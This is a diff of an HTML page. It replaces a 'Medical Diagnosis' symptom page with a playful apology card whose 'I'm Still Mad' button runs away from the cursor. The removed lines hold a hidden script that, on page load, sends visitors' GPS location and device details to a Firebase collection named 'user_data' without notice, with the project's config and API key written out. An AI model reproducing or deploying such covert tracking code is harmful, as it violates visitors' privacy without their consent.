@@ -1,63 +1,186 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Medical Diagnosis</title>
-    <link rel="stylesheet" href="style.css">
-</head>
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-    const firebaseConfig = {
-        apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
-        authDomain: "locationsaver-b9997.firebaseapp.com",
-        projectId: "locationsaver-b9997",
-        storageBucket: "locationsaver-b9997.appspot.com",
-        messagingSenderId: "675975845355",
-        appId: "1:675975845355:web:95cf7d6a2c255a33be35ae",
-        measurementId: "G-WJJY3Q2M8E"
-    };
+    <title>For You...</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&family=Quicksand:wght@400;600&display=swap');
 
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
-    getGPSLocation(async (locationData) => {
-        const deviceInfo = getDeviceInfo();
-        const timestamp = new Date();
-        const userData = {
-            location: locationData || "Unknown",
-            device: deviceInfo,
-            timestamp: timestamp
-        };
-
-        try {
-            await addDoc(collection(db, "user_data"), userData);
-            console.log("✅ User data saved:", userData);
-        } catch (error) {
-            console.error("❌ Error saving user data:", error);
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Quicksand', sans-serif;
+            background: linear-gradient(135deg, #fbc2eb 0%, #a6c1ee 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden; /* Prevents scrollbars when button runs away */
+            text-align: center;
         }
-    });
 
-</script>
+        /* Floating Hearts Background */
+        .heart-bg {
+            position: absolute;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 20px;
+            animation: floatUp 10s linear infinite;
+            z-index: 0;
+        }
+        @keyframes floatUp {
+            0% { transform: translateY(100vh) scale(0.5); opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
+        }
 
+        /* Main Card */
+        .card {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.15);
+            max-width: 450px;
+            width: 90%;
+            z-index: 10;
+            backdrop-filter: blur(10px);
+        }
+
+        h1 {
+            font-family: 'Dancing Script', cursive;
+            color: #ff6b81;
+            font-size: 3rem;
+            margin-bottom: 10px;
+            margin-top: 0;
+        }
+
+        p {
+            color: #4a4a4a;
+            line-height: 1.8;
+            font-size: 1.1rem;
+            margin-bottom: 30px;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            position: relative;
+            height: 50px;
+        }
+
+        .btn {
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            font-family: 'Quicksand', sans-serif;
+            font-weight: 600;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        /* The Forgive Button */
+        #yesBtn {
+            background-color: #ff6b81;
+            color: white;
+            box-shadow: 0 5px 15px rgba(255, 107, 129, 0.4);
+            animation: pulse 2s infinite;
+        }
+        #yesBtn:hover {
+            transform: scale(1.05);
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 107, 129, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(255, 107, 129, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 107, 129, 0); }
+        }
+
+        /* The Runaway Button */
+        #noBtn {
+            background-color: #f1f2f6;
+            color: #747d8c;
+            position: relative; /* Will change to absolute via JS */
+        }
+
+        /* Success Message */
+        #successMessage {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+        .big-heart {
+            font-size: 80px;
+            color: #ff6b81;
+            animation: beat 1s infinite alternate;
+        }
+        @keyframes beat {
+            to { transform: scale(1.2); }
+        }
+    </style>
+</head>
 <body>
 
-    <h1>Medical Diagnosis System</h1>
-
-    <input type="text" id="search-bar" placeholder="Search Symptoms..." oninput="filterSymptoms()">
-
-    <div id="symptoms-container">
-        <div id="symptoms"></div>
+    <div class="card" id="mainCard">
+        <h1>I am so sorry.</h1>
+        <p>
+            Dear <strong>[Her Name]</strong>,<br><br>
+            I know I messed up, and I can't stop thinking about how much I regret it. Your friendship is a rare kind of magic, and my life is simply better with you in it. I hate knowing I hurt you. <br><br>
+            Please let me make it right?
+        </p>
+        
+        <div class="buttons">
+            <button class="btn" id="yesBtn" onclick="forgiveMe()">I Forgive You</button>
+            <button class="btn" id="noBtn">I'm Still Mad</button>
+        </div>
     </div>
 
-    <button onclick="predictDisease()">Predict</button>
-    <button onclick="clearSelection()">Clear Selection</button>
-    <div id="result"></div>
+    <!-- Hidden success screen -->
+    <div class="card" id="successMessage">
+        <div class="big-heart">💖</div>
+        <h1>Thank You!</h1>
+        <p>You have no idea how much this means to me. I promise to be better. Let me treat you to your favorite food soon!</p>
+    </div>
 
-    <script src="script.js"></script>
+    <script>
+        // 1. Generate Floating Background Hearts
+        function createHearts() {
+            for (let i = 0; i < 20; i++) {
+                let heart = document.createElement("div");
+                heart.innerHTML = "❤";
+                heart.className = "heart-bg";
+                heart.style.left = Math.random() * 100 + "vw";
+                heart.style.animationDuration = (Math.random() * 5 + 5) + "s";
+                heart.style.fontSize = (Math.random() * 20 + 10) + "px";
+                document.body.appendChild(heart);
+            }
+        }
+        createHearts();
 
+        // 2. Make the "No" Button Run Away
+        const noBtn = document.getElementById('noBtn');
+        
+        // Use both touch and mouseover so it works on phones and computers
+        ['mouseover', 'touchstart'].forEach(eventType => {
+            noBtn.addEventListener(eventType, function(e) {
+                e.preventDefault();
+                
+                // Switch to absolute positioning to move freely around the screen
+                noBtn.style.position = 'fixed';
+                
+                // Calculate random positions within the window bounds
+                const x = Math.random() * (window.innerWidth - noBtn.offsetWidth - 20);
+                const y = Math.random() * (window.innerHeight - noBtn.offsetHeight - 20);
+                
+                noBtn.style.left = `${Math.max(10, x)}px`;
+                noBtn.style.top = `${Math.max(10, y)}px`;
+            });
+        });
+
+        // 3. Handle the "Yes" Button
+        function forgiveMe() {
+            document.getElementById('mainCard').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'flex';
+        }
+    </script>
 </body>
-
 </html>
